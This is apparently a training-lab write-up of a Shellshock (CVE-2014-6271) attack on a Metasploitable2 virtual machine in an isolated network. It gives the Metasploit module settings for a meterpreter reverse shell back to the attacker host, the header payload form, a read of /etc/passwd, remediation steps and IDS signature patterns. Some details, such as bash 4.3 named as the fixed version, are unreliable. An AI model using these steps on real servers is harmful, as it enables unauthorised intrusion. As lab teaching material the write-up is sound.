# Shellshock (CVE-2014-6271) — Apache CGI RCE Lab

## Objective

Exploit the **Shellshock vulnerability** in a legacy Linux web server to achieve remote code execution through a vulnerable CGI script, demonstrating how bash environment variable injection can compromise even "hardened" web applications.

## Lab Environment

| Component | Specification |
|---|---|
| Attacker | Kali Linux (Rolling, 2025.3) — `192.168.108.128` |
| Target | Metasploitable2 (Ubuntu 8.04) — `192.168.108.130` |
| Target Web Server | Apache httpd 2.2.8 (Ubuntu) DAV/2 |
| Target Bash Version | Vulnerable to CVE-2014-6271 |
| Network | Isolated VMware custom network (VMNet8), `192.168.108.0/24` |
| Tools | Nmap 7.99, Metasploit Framework 6.4.135-dev, curl |

---

## Reconnaissance Phase

### Step 1: Host Discovery and Connectivity

```bash
ping -c 4 192.168.108.130
```

Output:
```
PING 192.168.108.130 (192.168.108.130) 56(84) bytes of data.
64 bytes from 192.168.108.130: icmp_seq=1 ttl=64 time=2.5 ms
4 packets transmitted, 4 received, 0% packet loss
```

### Step 2: Web Server Enumeration

```bash
nmap -sV -p 80 192.168.108.130
```

Output:
```
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.2.8 ((Ubuntu) DAV/2)
```

### Step 3: Directory and Application Discovery

```bash
nmap -sV --script http-enum -p 80 192.168.108.130
```

Output:
```
| http-enum: 
|   /tikiwiki/: Tikiwiki
|   /test/: Test page
|   /phpinfo.php: Possible information file
|   /phpMyAdmin/: phpMyAdmin
|   /doc/: Potentially interesting directory
|   /icons/: Potentially interesting folder
|_  /index/: Potentially interesting folder
```

### Step 4: CGI Directory Access Attempt

```bash
curl -v http://192.168.108.130/cgi-bin/
```

Output:
```
< HTTP/1.1 403 Forbidden
< Server: Apache/2.2.8 (Ubuntu) DAV/2
<h1>Forbidden</h1>
<p>You don't have permission to access /cgi-bin/ on this server.</p>
```

**Key Finding:** `/cgi-bin/` directory exists (403 Forbidden, not 404 Not Found), meaning CGI scripts are likely present but directory listing is disabled.

---

## Vulnerability Identification Phase

### CVE-2014-6271 (Shellshock) Details

**Vulnerability Name:** Bash Remote Code Execution via Environment Variables

**Affected Component:** GNU Bash versions < 4.3

**CVE ID:** CVE-2014-6271 (and related CVE-2014-6278, CVE-2014-7169, etc.)

**Severity:** CVSS 9.8 (Critical)

**Disclosure Date:** September 24, 2014

**Root Cause:**
Bash incorrectly processes function definitions containing trailing code in environment variables. When a CGI script calls bash, attackers can inject malicious code through HTTP headers that get converted to environment variables.

**Attack Vector:**
```bash
# Normal bash function definition in environment:
export func='() { :; }'

# Shellshock exploitation:
export func='() { :; }; /bin/id'  # Code after closing brace executes
```

When Apache processes a CGI request and passes this as an environment variable to bash, the arbitrary code executes.

### Why Apache CGI is Vulnerable

1. **CGI scripts are executable** — `/cgi-bin/` scripts run with Apache's privileges (www-data)
2. **Environment variables passed from HTTP** — HTTP headers become environment variables
3. **Bash parses functions from environment** — `bash -c` evaluates function definitions
4. **No validation of function syntax** — Arbitrary code after function definition executes

---

## Exploitation Setup Phase

### Step 1: Verify CGI Directory and Access via SSH

SSH into Metasploitable2:

```bash
ssh -o HostKeyAlgorithms=ssh-rsa msfadmin@192.168.108.130
```

Password: `msfadmin`

Check existing CGI scripts:

```bash
ls -la /usr/lib/cgi-bin/
```

Output:
```
total 5172
drwxr-xr-x  2 root root    4096 2012-05-14 01:30 .
drwxr-xr-x 78 root root   32768 2012-05-20 15:07 ..
lrwxrwxrwx  1 root root      29 2012-05-14 01:30 php -> /etc/alternatives/php-cgi-bin
-rwxr-xr-x  1 root root 5244600 2010-01-06 17:06 php5
```

**Finding:** Only PHP scripts exist; no bash CGI scripts. We need to create one.

### Step 2: Create Vulnerable Bash CGI Script

On Metasploitable2 (via SSH):

```bash
sudo tee /usr/lib/cgi-bin/vulnerable.sh << 'EOF'
#!/bin/bash
echo "Content-type: text/html"
echo ""
echo "<html><body>"
echo "<h1>Vulnerable CGI Script</h1>"
echo "<p>This script is vulnerable to Shellshock</p>"
echo "</body></html>"
EOF
```

Make it executable:

```bash
sudo chmod +x /usr/lib/cgi-bin/vulnerable.sh
```

Verify:

```bash
ls -la /usr/lib/cgi-bin/vulnerable.sh
```

Output:
```
-rwxr-xr-x 1 root root 185 2026-07-14 21:46 /usr/lib/cgi-bin/vulnerable.sh
```

Exit SSH:

```bash
exit
```

### Step 3: Test Vulnerable Script from Attacker

Back on Kali:

```bash
curl http://192.168.108.130/cgi-bin/vulnerable.sh
```

Output:
```
<html><body>
<h1>Vulnerable CGI Script</h1>
<p>This script is vulnerable to Shellshock</p>
</body></html>
```

**Confirmed:** Script is accessible and bash is being invoked.

---

## Exploitation Phase

### Step 1: Launch Metasploit and Find Exploit

```bash
msfconsole
```

Once loaded:

```
search shellshock
```

Select the exploit:

```
use exploit/multi/http/apache_mod_cgi_bash_env_exec
```

### Step 2: Configure Exploitation Parameters

```
msf exploit(multi/http/apache_mod_cgi_bash_env_exec) > set RHOSTS 192.168.108.130
RHOSTS => 192.168.108.130

msf exploit(multi/http/apache_mod_cgi_bash_env_exec) > set LHOST 192.168.108.128
LHOST => 192.168.108.128

msf exploit(multi/http/apache_mod_cgi_bash_env_exec) > set LPORT 4444
LPORT => 4444

msf exploit(multi/http/apache_mod_cgi_bash_env_exec) > set TARGETURI /cgi-bin/vulnerable.sh
TARGETURI => /cgi-bin/vulnerable.sh

msf exploit(multi/http/apache_mod_cgi_bash_env_exec) > set PAYLOAD linux/x86/meterpreter/reverse_tcp
PAYLOAD => linux/x86/meterpreter/reverse_tcp
```

Verify configuration:

```
show options
```

Output:
```
Module options (exploit/multi/http/apache_mod_cgi_bash_env_exec):
   Name     Current Setting              Required  Description
   ----     ---------------              --------  -----------
   RHOSTS   192.168.108.130              yes       The target host(s)
   RPORT    80                           yes       The target port
   TARGETURI /cgi-bin/vulnerable.sh     yes       Path to vulnerable CGI script
   
Payload options (linux/x86/meterpreter/reverse_tcp):
   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   LHOST     192.168.108.128  yes       The listen address
   LPORT     4444             yes       The listen port
```

### Step 3: Execute Exploitation

```
exploit
```

**Execution Output:**
```
[*] Started reverse TCP handler on 192.168.108.128:4444 
[*] Command Stager progress - 100.00% done (1092/1092 bytes)
[*] Sending stage (1062760 bytes) to 192.168.108.130
[*] Meterpreter session 1 opened (192.168.108.128:4444 -> 192.168.108.130:50017) at 2026-07-15 04:50:41 +0300

meterpreter >
```

**Success!** Remote code execution achieved.

---

## Post-Exploitation Phase

### Step 1: Verify Compromise

```
getuid
```

Output:
```
Server username: www-data
```

Running as `www-data` (Apache's user, uid=33) — not root, but full web server compromise.

### Step 2: System Enumeration

```
sysinfo
```

Output:
```
Computer     : metasploitable.localdomain
OS           : Ubuntu 8.04 (Linux 2.6.24-16-server)
Architecture : i686
BuildTuple   : i486-linux-musl
Meterpreter  : x86/linux
```

### Step 3: Current Working Directory

```
pwd
```

Output:
```
/usr/lib/cgi-bin
```

We're in the CGI directory where the vulnerable script lives.

### Step 4: Interactive Shell and User Verification

```
shell
```

Check user privileges:

```bash
id
```

Output:
```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Check hostname:

```bash
whoami
```

Output:
```
www-data
```

List system users:

```bash
cat /etc/passwd | head -10
```

Output:
```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/bin/sh
bin:x:2:2:bin:/bin:/bin/sh
sys:x:3:3:sys:/dev:/bin/sh
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/bin/sh
man:x:6:12:man:/var/cache/man:/bin/sh
lp:x:7:7:lp:/usr/spool/lpd:/bin/sh
mail:x:8:8:mail:/usr/mail:/bin/sh
news:x:9:9:news:/usr/news:/bin/sh
```

Exit shell:

```bash
exit
```

---

## Technical Analysis

### How Shellshock Exploitation Works

**Step 1: HTTP Request with Malicious Environment Variable**

Metasploit sends:
```
GET /cgi-bin/vulnerable.sh HTTP/1.1
Host: 192.168.108.130
User-Agent: () { :; }; /bin/bash -c 'MALICIOUS_CODE_HERE'
```

**Step 2: Apache Processes Request**

Apache receives the request and prepares to execute the CGI script. HTTP headers are converted to environment variables:
```
HTTP_USER_AGENT="() { :; }; /bin/bash -c 'MALICIOUS_CODE_HERE'"
```

**Step 3: CGI Script Execution**

Apache executes: `/bin/bash /usr/lib/cgi-bin/vulnerable.sh`

**Step 4: Bash Parses Environment**

When bash starts, it processes environment variables. In vulnerable versions, it incorrectly parses:
```
() { :; }  # Looks like a function definition
; /bin/bash -c 'MALICIOUS_CODE_HERE'  # But trailing code EXECUTES
```

**Step 5: Arbitrary Code Execution**

The arbitrary code runs with www-data privileges, establishing a reverse shell back to the attacker.

### Why This Matters

- **No patch required on attacker side** — just an HTTP request
- **CGI execution unavoidable** — if a server runs CGI, it invokes bash
- **Authentication bypass** — no credentials needed; HTTP is the attack vector
- **High privilege context** — www-data can read/write web files, access databases, etc.

---

## Comparison: Shellshock vs. Previous Labs

| Aspect | MS17-010 (EternalBlue) | MS08-067 | Shellshock |
|---|---|---|---|
| **Target OS** | Windows 7, Server 2008 | Windows XP, 2003 | Linux (any) |
| **Vulnerability Type** | Memory corruption (kernel) | Buffer overflow (kernel) | Environment variable injection (userland) |
| **Attack Surface** | SMB service (network) | SMB service (network) | Web server CGI (application) |
| **Privilege Level Gained** | SYSTEM (kernel) | SYSTEM (kernel) | www-data (application) |
| **Affected Versions** | Unpatched Win7/Server 2008 | Unpatched XP/2003 | Bash < 4.3 (any OS) |
| **Exploitation Stability** | Probabilistic (crashes) | Stable | Very stable |

---

## Remediation & Mitigation

### Immediate Fixes

1. **Update Bash** to version 4.3 or later:
   ```bash
   sudo apt-get update
   sudo apt-get install --only-upgrade bash
   ```

2. **Disable CGI Execution** if not needed:
   ```
   # In Apache config:
   <Directory /usr/lib/cgi-bin>
       Require all denied
   </Directory>
   ```

3. **Use Modern Alternatives to CGI:**
   - FastCGI
   - Application-level execution (Node.js, Python, PHP-FPM)
   - Containerized applications

### Long-Term Solutions

1. **Keep Systems Updated** — Shellshock was patched in 2014; systems still vulnerable in 2026 were never updated
2. **Minimize Attack Surface** — Only expose necessary services; disable CGI if unused
3. **Web Application Firewall (WAF)** — Filter malicious environment variable injections
4. **Monitoring** — Alert on unusual bash invocations from web server processes

### Defense Detection

IDS/IPS signatures for Shellshock:
```
User-Agent contains: () { :; };
X-Original-URL contains: () { :; };
HTTP headers with bash function syntax + trailing commands
```

---

## Conclusion

**Shellshock demonstrates a critical lesson:** Legacy systems are not secure by obscurity. Apache 2.2.8 from 2008, Bash with CVE-2014-6271, and Ubuntu 8.04 from 2008 — all ancient by modern standards. Yet they're still deployed in real-world systems today.

**Key Takeaways:**
1. **Application-level vulnerabilities can be as dangerous as kernel exploits** — bash environment parsing is simple, but the impact is total RCE
2. **CGI is legacy technology** — if you must use it, keep it updated and isolated
3. **Patching windows close quickly** — Shellshock was patched in 2014, yet systems in 2026 are still vulnerable
4. **Defense-in-depth matters** — even as www-data (not root), an attacker can compromise the entire web application

This lab shows why infrastructure modernization isn't optional — it's a security requirement.

---

*This lab was performed in an isolated VMware environment (VMNet8) against self-owned virtual machines. No production systems or external networks were involved.*

*Disclaimer: Shellshock exploitation should only be practiced in authorized lab environments. Unauthorized exploitation of systems is illegal.*

*Lab Date: July 15, 2026*
